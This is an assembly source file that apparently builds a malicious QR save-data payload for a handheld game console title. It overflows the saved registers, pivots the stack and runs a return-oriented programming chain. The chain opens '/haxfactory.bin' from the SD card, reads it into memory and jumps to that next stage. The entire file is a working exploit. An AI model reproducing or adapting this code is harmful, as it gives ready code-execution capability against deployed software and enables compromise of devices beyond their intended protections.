#include "constants.h"

#define MAKE_PTR(addr) (addr - qrstart + QR_BUF_ADDR)

.org 0x0
qrstart:

// QR header garbage.
.byte 0x16
.byte 0xCF
.byte 0x5A
.byte 0x39
.byte 0x04
.byte 0xB7
.byte 0xD1
.byte 0xCC
.byte 0x01
.byte 0x00
.byte 0x07

.byte 0x40  // padding?

.ascii "Haxxxxxxxxxxxx" // save name

.org 0x77, 0x20
.word 0x01fdfdfd // r4
.word R5_OVERFLOW + (pivot_ctx-qrstart) - 0x8c // r5 (the value is loaded from +0x8c, so subtract the same amount..)
.word 0x66666666 // r6
.word R7_OVERFLOW + (pivot_ctx-qrstart) // r7
.word 0x88888888 // r8
.word 0x99999999 // r9
.word 0xAAAAAAAA // r10
.word 0xBBBBBBBB // r11
.word R0_OVERFLOW // initial pc - r0 overflow gadget

.align 4

pivot_ctx:
    .word MAKE_PTR(.next_gadget) // 0
.next_gadget:
    .word R6_OVERFLOW // 4 - next gadget that sets up r1 for us
    .word GADGET_R2R3R4R5R6 // 8 - r1 value aka gadget after pivot
    .word GARBAGE // 12 - padding
    .word STACK_PIVOT // 16 - r2

start:
// Start of the initial rop chain.
.word GADGET_R0                   // pop {r0, pc}
    .word FS_U_HANDLE                 // r0 - handle ptr
.word GADGET_R1
    .word MAKE_PTR(file_obj_ctx) - 4  // r1 - pointer to file handle
.word GADGET_R2R3R4R5R6           // pop {r2-r6, pc}
    .word 0                           // r2 - tx
    .word 9                           // r3 - archive id (sdmc)
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6
.word FS_OPEN_FILE_DIRECTLY+4         // fs::OpenFileDirectly(...)
    .word GARBAGE                     // r0
    .word MAKE_PTR(file_obj_ctx)      // r1 - pointer to file handle
    .word GARBAGE                     // r2
    .word GARBAGE                     // r3
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6
    .word GARBAGE                     // r7
    .word GARBAGE                     // r8
    .word GARBAGE                     // r9
    .word GARBAGE                     // r10
    .word GARBAGE                     // r11
    .word GARBAGE                     // r12
    .word GADGET_ADD_SP_20_POP_R4     // pc - skip stack args
    .word 1                           // sp_arg0 - archive path type
    .word MAKE_PTR(sdmc_str)          // sp_arg1 - archive path ptr
    .word 1                           // sp_arg2 - archive path size (with null!)
    .word 4                           // sp_arg3 - file path type
    .word MAKE_PTR(file_str)          // sp_arg4 - file path ptr
    .word (file_str_end-file_str)*2   // sp_arg5 - file path size (with null!)
    .word 1                           // sp_arg6 - read flags
    .word 0                           // sp_arg7 - attributes
    .word GARBAGE                     // r4
.word GADGET_R0                       // pop {r0, pc}
    .word MAKE_PTR(file_obj_ctx)  // r0 - file handle ptr
.word GADGET_R1
    .word MAKE_PTR(random_valid_addr) // r1       output ptr for bytes_read
.word GADGET_R2R3R4R5R6           // pop {r2-r6, pc}
    .word 0                           // r2       file_offset = (u64) 0
    .word 0                           // r3
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6
.word FS_READ_FILE+4               // fs::TryReadFile(...)
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
    .word GARBAGE                     // r6
    .word GADGET_R2R3R4R5R6           // pc       jump past read-file stack args
    .word BLOCKBIN_LOAD_ADDR          // sp_arg0  output ptr
    .word 0x1000                      // sp_arg1  how many bytes to read
    .word GARBAGE                     // r3
    .word GARBAGE                     // r4
    .word GARBAGE                     // r5
.word GADGET_R0           // pop {r0, pc}
    .word BLOCKBIN_LOAD_ADDR
.word GADGET_R1
    .word GADGET_NOP // pop {pc}
.word STACK_PIVOT // pivot again to stage1..
sdmc_str:
    .ascii "\0\0\0\0"
file_str:
    .string16 "/haxfactory.bin\0"
file_str_end:
file_obj_ctx:
    .word GARBAGE
random_valid_addr:
    .word GARBAGE
    .word GARBAGE

.org 0x21c, 0x00
.word 0x01001400
.org 0x22c, 0x00 // high score block
.rept 10
.word 0
.endr
.rept 10
.word 0x41414141
.word 0x41
.endr

.word 0xbef6ccd6 // actually the crc?
.align 0x4
